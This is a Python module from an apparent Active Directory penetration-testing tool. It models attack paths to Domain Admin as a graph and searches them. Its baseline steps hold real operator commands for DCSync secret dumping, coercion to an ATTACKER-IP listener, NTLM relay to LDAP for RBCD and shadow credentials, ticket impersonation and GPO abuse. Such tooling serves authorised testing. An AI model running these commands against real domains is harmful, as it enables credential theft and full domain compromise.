"""Attack-path data model and path-building engine.

Domainerator's goal is to map *routes* from a starting privilege level
(unauthenticated, or a low-privileged domain user) to Domain Admin / Enterprise
Admin, so an operator can walk them manually. This module models that as a
directed graph and searches it.

Core concepts
-------------
* ``Capability``  - a discrete state of access the operator can hold. Nodes in
  the graph are capabilities (e.g. "have a valid credential", "hold a
  Kerberoastable TGS", "can DCSync"). The search starts from whatever
  capabilities we already have and looks for a route to a DA/EA capability.

* ``PathStep``    - one hop: consuming some ``requires`` capabilities and
  granting a ``grants`` capability, with the operator command to perform it, a
  reliability score, and a noise score.

* ``AttackPath``  - an ordered list of steps from start to goal, with an
  aggregate reliability used for ranking.

* ``PathEngine``  - collects steps (from checks and from BloodHound), then does
  a best-first search from the starting capabilities to any goal capability.

This module performs **no exploitation**. Each step carries the command a human
would run; Domainerator only reasons about which commands *would* chain.
"""

from __future__ import annotations

import enum
import heapq
import itertools
from collections.abc import Iterable
from dataclasses import dataclass


class Capability(enum.Enum):
    """A discrete access state used as a node in the attack graph.

    These are intentionally coarse. Finer detail (which account, which host)
    lives on the PathStep as free text; the graph only needs enough structure
    to reason about ordering.
    """

    # --- starting states -------------------------------------------------
    UNAUTHENTICATED = "unauthenticated"          # network access, no creds
    VALID_CREDENTIALS = "valid_credentials"      # any working domain account
    LOW_PRIV_USER = "low_priv_user"              # authenticated low-priv user

    # --- intermediate footholds -----------------------------------------
    USER_LIST = "user_list"                      # enumerated list of usernames
    CRACKABLE_HASH = "crackable_hash"            # a hash we can crack offline
    SPN_TGS = "spn_tgs"                          # Kerberoastable TGS obtained
    ASREP_HASH = "asrep_hash"                    # AS-REP roastable hash obtained
    LOCAL_ADMIN = "local_admin"                  # local admin on some host
    MACHINE_ACCOUNT = "machine_account"          # can create/control a computer obj
    CERT_AS_USER = "cert_as_user"                # cert authenticating as a user
    CERT_AS_DA = "cert_as_da"                    # cert authenticating as DA/DC
    DACL_CONTROL = "dacl_control"                # write access over a principal
    RESET_PASSWORD = "reset_password"            # can reset a target's password
    ADD_TO_GROUP = "add_to_group"                # can add a member to a group
    RBCD = "rbcd"                                # resource-based constrained deleg
    COERCIBLE_AUTH = "coercible_auth"            # can coerce DC/host auth
    RELAY_TARGET = "relay_target"                # a relayable endpoint (no signing)
    WEBDAV_HOST = "webdav_host"                  # host running WebClient (HTTP coercion)
    LDAP_RELAY_TARGET = "ldap_relay_target"      # DC LDAP reachable for relay (no channel binding)
    GPO_CONTROL = "gpo_control"                  # write control over a GPO / its link
    NTLMV1_HOST = "ntlmv1_host"                  # host accepting NTLMv1 (crackable/relayable)
    SELF_RELAY_TARGET = "self_relay_target"      # host vulnerable to NTLM reflection
    SCCM_MANAGEMENT_POINT = "sccm_management_point"  # discovered SCCM MP / site
    SCCM_NAA_CREDS = "sccm_naa_creds"            # recovered SCCM Network Access Account creds

    # --- goals -----------------------------------------------------------
    DCSYNC = "dcsync"                            # can replicate secrets (near-DA)
    DOMAIN_ADMIN = "domain_admin"                # Domain Admins
    ENTERPRISE_ADMIN = "enterprise_admin"        # Enterprise Admins / forest

    @property
    def is_goal(self) -> bool:
        return self in _GOAL_CAPABILITIES


_GOAL_CAPABILITIES = {
    Capability.DCSYNC,
    Capability.DOMAIN_ADMIN,
    Capability.ENTERPRISE_ADMIN,
}


class Reliability(enum.IntEnum):
    """How dependable a step is. Higher == more reliable / preferred."""

    SPECULATIVE = 1   # depends on external factors (crackable password, spray)
    MODERATE = 2      # usually works with some conditions
    HIGH = 3          # deterministic given the precondition
    GUARANTEED = 4    # essentially always works if precondition holds

    @property
    def label(self) -> str:
        return self.name.capitalize()


class Noise(enum.IntEnum):
    """Relative detection risk / disruption of performing a step."""

    QUIET = 1
    MODERATE = 2
    LOUD = 3        # e.g. password spraying, coercion, lockout risk

    @property
    def label(self) -> str:
        return self.name.capitalize()


@dataclass
class PathStep:
    """A single hop in an attack path.

    ``requires`` is the set of capabilities that must be held *before* this step
    and ``grants`` is the capability produced by it. ``command`` is the exact
    operator command (already redacted of secrets where relevant).
    """

    name: str
    technique: str                    # short technique id, e.g. "ESC1", "Kerberoast"
    requires: frozenset[Capability]
    grants: Capability
    command: str
    description: str
    reliability: Reliability = Reliability.MODERATE
    noise: Noise = Noise.MODERATE
    # Optional human context: which principal/host this hop concerns.
    detail: str = ""
    # Where the step came from: "check" or "bloodhound".
    source: str = "check"

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "technique": self.technique,
            "requires": sorted(c.value for c in self.requires),
            "grants": self.grants.value,
            "command": self.command,
            "description": self.description,
            "reliability": self.reliability.label,
            "noise": self.noise.label,
            "detail": self.detail,
            "source": self.source,
        }


@dataclass
class AttackPath:
    """An ordered chain of steps from a start capability to a goal."""

    steps: list[PathStep]
    goal: Capability

    @property
    def length(self) -> int:
        return len(self.steps)

    @property
    def min_reliability(self) -> Reliability:
        """A chain is only as reliable as its weakest link."""
        if not self.steps:
            return Reliability.GUARANTEED
        return min(s.reliability for s in self.steps)

    @property
    def max_noise(self) -> Noise:
        if not self.steps:
            return Noise.QUIET
        return max(s.noise for s in self.steps)

    @property
    def score(self) -> tuple:
        """Sort key: prefer higher weakest-link reliability, then fewer steps,
        then quieter. Returned so ``sorted(..., reverse=True)`` ranks best first.
        """
        return (int(self.min_reliability), -self.length, -int(self.max_noise))

    def summary(self) -> str:
        return " -> ".join(s.technique for s in self.steps) + f" => {self.goal.value}"

    def to_dict(self) -> dict:
        return {
            "goal": self.goal.value,
            "length": self.length,
            "min_reliability": self.min_reliability.label,
            "max_noise": self.max_noise.label,
            "summary": self.summary(),
            "steps": [s.to_dict() for s in self.steps],
        }


class PathEngine:
    """Collects candidate steps and searches for chains to a goal.

    The search is a best-first (Dijkstra-like) expansion over capability sets.
    Because a single step may require *multiple* capabilities, the state is the
    frozenset of capabilities currently held; we expand by any step whose
    ``requires`` is a subset of the held set and whose ``grants`` is new.
    """

    def __init__(self) -> None:
        self._steps: list[PathStep] = []

    def add_step(self, step: PathStep) -> None:
        self._steps.append(step)

    def add_steps(self, steps: Iterable[PathStep]) -> None:
        for s in steps:
            self.add_step(s)

    @property
    def steps(self) -> list[PathStep]:
        return list(self._steps)

    def find_paths(
        self,
        start: Iterable[Capability],
        goals: Iterable[Capability] | None = None,
        max_depth: int = 8,
    ) -> list[AttackPath]:
        """Return ranked attack paths from ``start`` to any goal capability.

        We record, for each goal capability, the best (highest weakest-link
        reliability, then shortest) chain discovered. Best-first over states
        keeps the search tractable on realistic step counts.
        """
        start_set = frozenset(start)
        goal_set = set(goals) if goals is not None else set(_GOAL_CAPABILITIES)

        # Priority queue ordered so the most promising partial chain expands
        # first. We negate reliability for a min-heap, tie-break on depth.
        # Entry: (‑min_reliability, depth, tiebreak, held_frozenset, steps_list)
        counter = itertools.count()
        start_entry = (
            -int(Reliability.GUARANTEED),
            0,
            next(counter),
            start_set,
            [],
        )
        frontier: list[tuple] = [start_entry]

        # Best chain found per goal capability.
        best_paths: dict[Capability, AttackPath] = {}
        # Best (reliability, depth) seen for a held-set to prune revisits.
        visited: dict[frozenset, tuple[int, int]] = {}

        while frontier:
            neg_rel, depth, _, held, steps = heapq.heappop(frontier)
            cur_rel = -neg_rel

            # Record any goals newly satisfied by this state.
            for cap in held:
                if cap in goal_set and steps:
                    candidate = AttackPath(steps=list(steps), goal=cap)
                    existing = best_paths.get(cap)
                    if existing is None or candidate.score > existing.score:
                        best_paths[cap] = candidate

            if depth >= max_depth:
                continue

            # Prune: if we've reached this exact held-set with an equal or better
            # (reliability, shorter depth) before, skip.
            seen = visited.get(held)
            if seen is not None and (seen[0] > cur_rel or (seen[0] == cur_rel and seen[1] <= depth)):
                continue
            visited[held] = (cur_rel, depth)

            for step in self._steps:
                if step.grants in held:
                    continue  # nothing new
                if not step.requires.issubset(held):
                    continue  # precondition unmet
                new_held = held | {step.grants}
                new_steps = [*steps, step]
                new_rel = min(cur_rel, int(step.reliability))
                heapq.heappush(
                    frontier,
                    (-new_rel, depth + 1, next(counter), new_held, new_steps),
                )

        return sorted(best_paths.values(), key=lambda p: p.score, reverse=True)


# --- helpers to translate starting posture into capabilities ---------------

def starting_capabilities(
    *, authenticated: bool, is_low_priv: bool = True
) -> set[Capability]:
    """Map the operator's starting posture to seed capabilities."""
    caps: set[Capability] = {Capability.UNAUTHENTICATED}
    if authenticated:
        caps.add(Capability.VALID_CREDENTIALS)
        if is_low_priv:
            caps.add(Capability.LOW_PRIV_USER)
    return caps


def next_best_action(
    paths: list[AttackPath], held: Iterable[Capability]
) -> PathStep | None:
    """Return the single highest-value next step to run.

    Given the ranked paths and the capabilities we already hold, walk the
    best-ranked path and return its first step whose ``requires`` are already
    satisfied but whose ``grants`` is not yet held. That is the immediate,
    actionable move along the most reliable route to a goal.
    """
    held_set = set(held)
    for path in paths:  # already sorted best-first by the engine
        for step in path.steps:
            if step.grants in held_set:
                continue
            if step.requires.issubset(held_set):
                return step
        # If no step in this path is immediately actionable, try the next path.
    return None


def build_engine(check_results: Iterable, include_baseline: bool = True) -> PathEngine:
    """Assemble a PathEngine from all steps emitted by the check results.

    ``check_results`` is an iterable of runner.CheckResult (imported lazily to
    avoid a circular import). Each contributes its ``path_steps``. Baseline
    glue steps are added unless disabled.
    """
    engine = PathEngine()
    if include_baseline:
        engine.add_steps(baseline_steps())
    for result in check_results:
        steps = getattr(result, "path_steps", None) or []
        engine.add_steps(steps)
    return engine


def baseline_steps() -> list[PathStep]:
    """Technique-independent 'glue' steps that always hold in a domain.

    These connect capabilities that any operator can chain regardless of a
    specific finding, e.g. a set of valid credentials makes you a (low-priv)
    domain user, DCSync rights let you grab the krbtgt/Administrator hash, and
    an obtained DA hash is effectively Domain Admin. Keeping them here means the
    path engine can always close a chain that reaches DCSync.
    """
    return [
        PathStep(
            name="Valid credentials are a domain user",
            technique="Authenticate",
            requires=frozenset({Capability.VALID_CREDENTIALS}),
            grants=Capability.LOW_PRIV_USER,
            command="nxc smb DC -u USER -p PASS  # confirm authenticated context",
            description="Any working credential gives an authenticated domain user context.",
            reliability=Reliability.GUARANTEED,
            noise=Noise.QUIET,
            source="baseline",
        ),
        PathStep(
            name="DCSync -> Domain Admin",
            technique="DCSync",
            requires=frozenset({Capability.DCSYNC}),
            grants=Capability.DOMAIN_ADMIN,
            command="secretsdump.py -just-dc DOMAIN/USER@DC  # dump krbtgt/Administrator",
            description=(
                "With replication rights, dump domain secrets (krbtgt, "
                "Administrator) which is equivalent to Domain Admin."
            ),
            reliability=Reliability.GUARANTEED,
            noise=Noise.MODERATE,
            source="baseline",
        ),
        PathStep(
            name="Domain Admin -> Enterprise Admin (root domain)",
            technique="Cross-domain",
            requires=frozenset({Capability.DOMAIN_ADMIN}),
            grants=Capability.ENTERPRISE_ADMIN,
            command="# forge inter-realm TGT / abuse trust to reach forest root",
            description=(
                "From Domain Admin in a child domain, escalate to Enterprise "
                "Admin via SID history / trust key (only when a forest trust "
                "exists)."
            ),
            reliability=Reliability.MODERATE,
            noise=Noise.MODERATE,
            source="baseline",
        ),
        PathStep(
            name="Coerce authentication (PetitPotam/PrinterBug)",
            technique="Coercion",
            requires=frozenset({Capability.LOW_PRIV_USER}),
            grants=Capability.COERCIBLE_AUTH,
            command="coercer coerce -u USER -p PASS -t DC-IP -l ATTACKER-IP",
            description="Coerce a DC/host to authenticate to an attacker-controlled listener.",
            reliability=Reliability.MODERATE,
            noise=Noise.LOUD,
            source="baseline",
        ),
        # --- WebDAV / cross-protocol NTLM relay glue --------------------
        # A WebClient host lets us trigger *HTTP* auth, which (unlike SMB) can
        # be relayed to LDAP/LDAPS on a DC that lacks channel binding. That
        # relay can write RBCD or add shadow credentials to escalate.
        PathStep(
            name="Trigger WebDAV/HTTP auth from a WebClient host",
            technique="WebClientCoercion",
            requires=frozenset({Capability.WEBDAV_HOST, Capability.LOW_PRIV_USER}),
            grants=Capability.COERCIBLE_AUTH,
            command=(
                "# coerce the WebClient host to auth over HTTP to attacker@port "
                "(e.g. PetitPotam/DFSCoerce with a WebDAV listener target)"
            ),
            description=(
                "A host running the WebClient service can be coerced to "
                "authenticate over HTTP, which is relayable to LDAP (SMB auth "
                "is not)."
            ),
            reliability=Reliability.MODERATE,
            noise=Noise.LOUD,
            source="baseline",
        ),
        PathStep(
            name="Relay coerced HTTP auth to LDAP -> configure RBCD",
            technique="RelayToLDAP-RBCD",
            requires=frozenset({Capability.COERCIBLE_AUTH, Capability.LDAP_RELAY_TARGET}),
            grants=Capability.RBCD,
            command=(
                "ntlmrelayx.py -t ldaps://DC --delegate-access --no-dump "
                "--no-da --no-acl"
            ),
            description=(
                "Relay the coerced machine account authentication to LDAP(S) on "
                "a DC without channel binding to configure resource-based "
                "constrained delegation for a controlled account."
            ),
            reliability=Reliability.MODERATE,
            noise=Noise.LOUD,
            source="baseline",
        ),
        PathStep(
            name="Relay coerced HTTP auth to LDAP -> shadow credentials",
            technique="RelayToLDAP-ShadowCreds",
            requires=frozenset({Capability.COERCIBLE_AUTH, Capability.LDAP_RELAY_TARGET}),
            grants=Capability.RESET_PASSWORD,
            command="ntlmrelayx.py -t ldaps://DC --shadow-credentials --shadow-target 'TARGET$'",
            description=(
                "Relay coerced auth to LDAP(S) to add a Key Credential (shadow "
                "credentials) to a target, allowing PKINIT authentication as it."
            ),
            reliability=Reliability.MODERATE,
            noise=Noise.LOUD,
            source="baseline",
        ),
        PathStep(
            name="RBCD -> impersonate privileged user on target host",
            technique="RBCD-Impersonate",
            requires=frozenset({Capability.RBCD, Capability.MACHINE_ACCOUNT}),
            grants=Capability.LOCAL_ADMIN,
            command="getST.py -spn cifs/TARGET -impersonate administrator DOMAIN/PWN$:PASS",
            description=(
                "With RBCD configured and a controlled machine account, request "
                "a service ticket impersonating a privileged user to gain local "
                "admin on the target."
            ),
            reliability=Reliability.HIGH,
            noise=Noise.MODERATE,
            source="baseline",
        ),
        # --- GPO abuse glue ---------------------------------------------
        # Control over a GPO (or the ability to link one) that applies to a
        # privileged OU lets us run code as those computers/users. If the GPO
        # applies to Domain Controllers, that is effectively Domain Admin.
        PathStep(
            name="Abuse controlled GPO -> code execution on linked hosts",
            technique="GPO-Abuse",
            requires=frozenset({Capability.GPO_CONTROL}),
            grants=Capability.LOCAL_ADMIN,
            command=(
                "pygpoabuse DOMAIN/USER:PASS -gpo-id <GPO-GUID> "
                "-command 'net localgroup administrators PWN /add'"
            ),
            description=(
                "Modify a GPO you control to run code on the computers/users it "
                "applies to (scheduled task / startup script), yielding local "
                "admin on those hosts."
            ),
            reliability=Reliability.HIGH,
            noise=Noise.MODERATE,
            source="baseline",
        ),
        # --- NTLMv1 glue -------------------------------------------------
        # A host accepting NTLMv1 lets a coerced response be cracked (DES is
        # weak) to recover the NT hash, or downgraded/relayed. Cracking the
        # machine or user response yields usable credentials.
        PathStep(
            name="Coerce NTLMv1 response and crack -> credentials",
            technique="NTLMv1-crack",
            requires=frozenset({Capability.NTLMV1_HOST, Capability.COERCIBLE_AUTH}),
            grants=Capability.CRACKABLE_HASH,
            command=(
                "# capture NTLMv1 net-ntlm from coerced auth, then crack via "
                "crack.sh / hashcat -m 5500 (DES) to recover the NT hash"
            ),
            description=(
                "A host negotiating NTLMv1 produces a DES-based response that "
                "can be cracked to the NT hash, yielding reusable credentials."
            ),
            reliability=Reliability.MODERATE,
            noise=Noise.LOUD,
            source="baseline",
        ),
        # --- NTLM reflection glue ---------------------------------------
        # A host vulnerable to NTLM reflection lets coerced auth be relayed back
        # to itself (e.g. SMB->SMB or via the AuthN reflection flaw), granting
        # privileged local access on that same host.
        PathStep(
            name="Reflect coerced auth back to the same host -> local admin",
            technique="NTLM-Reflection",
            requires=frozenset({Capability.SELF_RELAY_TARGET, Capability.COERCIBLE_AUTH}),
            grants=Capability.LOCAL_ADMIN,
            command=(
                "ntlmrelayx.py -t SELF --no-smb-server ...  "
                "# reflect coerced machine auth back to the originating host"
            ),
            description=(
                "The host is vulnerable to NTLM reflection: coerced "
                "authentication can be relayed back to the same host to execute "
                "as it, granting local administrator access."
            ),
            reliability=Reliability.MODERATE,
            noise=Noise.LOUD,
            source="baseline",
        ),
        # --- SCCM / PXE NAA glue ----------------------------------------
        # Recovered Network Access Account credentials are ordinary (often
        # low-priv but domain-valid) credentials, a useful foothold.
        PathStep(
            name="SCCM NAA credentials -> domain foothold",
            technique="SCCM-NAA",
            requires=frozenset({Capability.SCCM_NAA_CREDS}),
            grants=Capability.VALID_CREDENTIALS,
            command="# use recovered NAA account as a domain credential",
            description=(
                "Network Access Account credentials recovered from SCCM (PXE "
                "boot media or policy) are valid domain credentials usable as a "
                "foothold."
            ),
            reliability=Reliability.HIGH,
            noise=Noise.QUIET,
            source="baseline",
        ),
    ]
